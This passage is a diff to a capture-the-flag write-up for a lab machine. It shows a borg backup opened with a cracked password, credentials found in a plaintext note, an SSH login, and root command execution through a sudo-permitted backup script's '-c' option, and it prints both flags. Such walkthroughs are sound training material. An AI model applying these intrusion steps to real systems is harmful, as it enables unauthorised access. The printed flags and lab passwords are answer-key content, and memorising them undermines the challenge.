@@ -69,7 +69,7 @@ We successfully crack the password using `hashcat` and the `rockyou` wordlist. T
 ```
 $ hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt 
 
-<snip>
+<...snip...>
 
 Dictionary cache built:
 * Filename..: /usr/share/wordlists/rockyou.txt
@@ -80,8 +80,82 @@ Dictionary cache built:
 
 $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
 
-<snip>
+<...snip...>
 
 ```
+
+Back to our music archive, we find out that the backup was made using the above password, and now can recover the archive's data using `borg` command line utility.
+
+To list all the backups in the archive:
+```
+$ borg list final_archive
+  
+Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: 
+music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
+```
+
+Now let's extract the data. Note that the command is executed from `dev` sub-folder and that the output of the command will be written in the same location as well.
+```
+$ borg extract final_archive::music_archive
+```
+
+Content of the backup:
+```
+$ tree
+.
+└── alex
+    ├── Desktop
+    │   └── secret.txt
+    ├── Documents
+    │   └── note.txt
+    ├── Downloads
+    ├── Music
+    ├── Pictures
+    ├── Public
+    ├── Templates
+    └── Videos
+
+```
+
+The content of secrete was a bit disappointing XD
+```
+shoutout to all the people who have gotten to this stage whoop whoop!"
+```
+However, the note is giving valuable information
+```
+Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
+
+alex:S3cretP@s3
+```
+
+Since the above are Alex credentials, we can try connecting via ssh.
+
+In the home directory we find the user flag: `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
+
+Left is the root flag. Making use of the given hint "There might be an interesting file running as root" and checking our Alex permissions, we find that the script `backup.sh` can be ran as a root.
+```
+$ sudo -l
+
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+```
+
+That script can execute any given command following the `-c` option. Using this we can enumerate files in the root repository.
+
+```
+$ sudo ./mp3backups/backup.sh -c "ls /root"
+
+<...snip...>
+Backup finished
+
+root.txt
+```
+
+Finally the root flag: `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`
+
 
 
